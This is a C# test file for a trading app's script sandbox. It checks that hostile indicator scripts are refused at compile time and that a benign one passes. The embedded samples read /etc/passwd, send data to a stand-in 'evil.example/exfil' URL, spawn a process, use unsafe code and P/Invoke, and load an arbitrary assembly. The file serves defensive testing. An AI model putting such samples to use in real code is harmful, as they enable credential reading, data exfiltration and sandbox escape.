using System;
using System.Linq;
using System.Threading.Tasks;
using AccessibleTrader.Core.Services;
using AccessibleTrader.Core.Services.Scripting;
using Xunit;

namespace AccessibleTrader.Tests;

/// <summary>
/// Defense-in-depth tests for the phase-4 script sandbox. Each test
/// compiles an indicator that deliberately reaches for a blocked
/// capability (filesystem, network, process-spawn, unsafe code, P/Invoke)
/// and asserts the compile is rejected with a sandbox-origin error.
///
/// <para>
/// These exercise the in-worker Roslyn semantic sandbox +
/// lexical pre-flight — the first layer in the defense stack. They
/// run on any platform (the compile pipeline is platform-agnostic),
/// unlike the OS-level AppContainer / sandbox-exec / isolatedProcess
/// layers which can only be verified on their target OS. If any test
/// here starts passing (i.e. the compile succeeds when it should fail)
/// that's a direct regression of the semantic sandbox — the second-layer
/// OS sandbox would still block runtime execution, but defense-in-depth
/// has lost a layer and needs fixing.
/// </para>
///
/// <para>
/// **Every test here used to assert only <c>Success == false</c>, with no positive control in
/// the file.** That is green under ANY universal compile failure — a broken implicit-usings
/// injection (none of the sources below declare their own <c>using</c>s), a Roslyn reference
/// resolution failure, a renamed SDK interface. Six sandbox-escape tests would all have gone on
/// passing while the sandbox they claim to exercise was never reached. The docstring's own claim
/// was "rejected with a sandbox-origin error", so that is now what is asserted:
/// <see cref="AssertRejectedBySandbox"/> requires the diagnostic to come from the lexical
/// pre-flight or the semantic walker, and <see cref="A_benign_indicator_is_not_refused_by_the_sandbox"/>
/// is the control proving a legal script gets all the way past both.
/// </para>
///
/// <para>
/// Message wording is still not pinned exactly — the marker phrases below are the two shapes
/// the sandbox emits, and if they change, a test failing here is the correct outcome rather
/// than a coupling problem: it means the sandbox's own diagnostics changed.
/// </para>
/// </summary>
public class HostileScriptTests
{
    /// <summary>The two shapes a sandbox refusal takes: "Blocked: …" from the lexical
    /// pre-flight, and the semantic walker's per-symbol reports.</summary>
    private static bool IsSandboxOrigin(string error) =>
        error.Contains("Blocked:", StringComparison.Ordinal)
        || error.Contains("is not allowed in user scripts", StringComparison.Ordinal)
        || error.Contains("is in blocked namespace", StringComparison.Ordinal);

    /// <summary>
    /// Asserts the compile was refused BY THE SANDBOX — not by a compile error that would refuse
    /// a legal script too. Prints the diagnostics on failure, because "it failed for some other
    /// reason" is the interesting case and is otherwise invisible.
    /// </summary>
    private static void AssertRejectedBySandbox(CompileResult result, string what)
    {
        string errors = string.Join("\n  ", result.Errors ?? Array.Empty<string>());

        Assert.False(result.Success, $"Sandbox regression: {what} compiled successfully.");
        Assert.True(result.Errors is { Length: > 0 }, $"{what} was refused with no diagnostic at all.");
        Assert.True(result.Errors!.Any(IsSandboxOrigin),
            $"{what} was refused, but NOT by the sandbox — so this test would stay green with the "
          + $"sandbox removed. Diagnostics were:\n  {errors}");
    }

    private static RoslynScriptingService NewScripting() =>
        new RoslynScriptingService(
            workerLauncher: new DefaultProcessLauncher(),
            // Bogus path — these tests expect compile-time rejection, so
            // we should never reach the worker-spawn step. If we do, the
            // File.Exists check fires a clear diagnostic.
            workerPathResolver: () => "/__hostile_script_test_never_used__");

    [Fact]
    public async Task Rejects_FileSystemAccess_ViaFileClass()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_FS";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    // Direct reference to System.IO.File — should be refused
                    // by the semantic sandbox walker before Emit.
                    var _ = System.IO.File.ReadAllText("/etc/passwd");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "a direct System.IO.File reference");
    }

    [Fact]
    public async Task Rejects_HttpClient()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_HTTP";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    using var http = new System.Net.Http.HttpClient();
                    var _ = http.GetStringAsync("https://evil.example/exfil").Result;
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "System.Net.Http.HttpClient");
    }

    [Fact]
    public async Task Rejects_ProcessStart()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_PROC";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    System.Diagnostics.Process.Start("calc.exe");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "System.Diagnostics.Process.Start");
    }

    [Fact]
    public async Task Rejects_UnsafeBlock_ViaLexicalPreflight()
    {
        const string src = """
            public sealed unsafe class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_UNSAFE";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    int x = 42;
                    int* p = &x;
                    return new[] { new double[] { *p } };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "unsafe code");
    }

    [Fact]
    public async Task Rejects_DllImport_ViaLexicalPreflight()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_DLLIMPORT";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                [System.Runtime.InteropServices.DllImport("kernel32.dll")]
                private static extern uint GetCurrentProcessId();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    return new[] { new double[] { GetCurrentProcessId() } };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "[DllImport] P/Invoke");
    }

    [Fact]
    public async Task Rejects_AssemblyLoad_ReflectionBypass()
    {
        // A classic escape attempt: use reflection to load an arbitrary
        // assembly. The semantic sandbox should recognise the
        // System.Reflection.Assembly.LoadFrom reference and refuse.
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_REFLECT";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    var asm = System.Reflection.Assembly.LoadFrom("/tmp/evil.dll");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "System.Reflection.Assembly.LoadFrom");
    }

    /// <summary>
    /// The positive control this file did not have.
    ///
    /// <para>
    /// A LEGAL indicator, compiled through the same factory with the same bogus worker path.
    /// It must get past the lexical pre-flight, past the semantic walker, and past Roslyn — and
    /// then fail only at the worker-spawn step, on the missing executable. If this ever starts
    /// reporting a sandbox diagnostic, or an ordinary compile error, then the six refusals above
    /// prove nothing: whatever refuses this would refuse them.
    /// </para>
    /// </summary>
    [Fact]
    public async Task A_benign_indicator_is_not_refused_by_the_sandbox()
    {
        const string src = """
            public sealed class BenignIndicator : ICustomIndicator
            {
                public string Id => "BENIGN";
                public string DisplayName => "benign";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    var outp = new double[data.Length];
                    for (int i = 0; i < data.Length; i++) outp[i] = data[i].Close;
                    return new[] { outp };
                }
            }
            """;

        var scripting = NewScripting();
        var result = await scripting.CompileIndicatorAsync(src);
        string errors = string.Join("\n  ", result.Errors ?? Array.Empty<string>());

        // The load-bearing half: nothing here is refused by the sandbox.
        Assert.DoesNotContain(result.Errors ?? Array.Empty<string>(), IsSandboxOrigin);

        // …and it got all the way past Roslyn, to the point of needing a worker. Which of the two
        // shapes below happens depends on whether ACCESSIBLETRADER_SCRIPT_IN_PROCESS is set, and
        // OutOfProcessScriptingTests sets it process-wide for the length of one of its tests — so
        // pinning only one of them makes this test fail whenever the two happen to overlap.
        // Either outcome proves the same thing: the pre-flight, the walker and the compile all
        // passed on a legal script.
        if (result.Success)
        {
            Assert.NotNull(result.Indicator);           // in-process opt-in was on
            scripting.UnloadScript(result.Indicator!.Id);
        }
        else
        {
            Assert.Contains("__hostile_script_test_never_used__", errors);
        }
    }
}
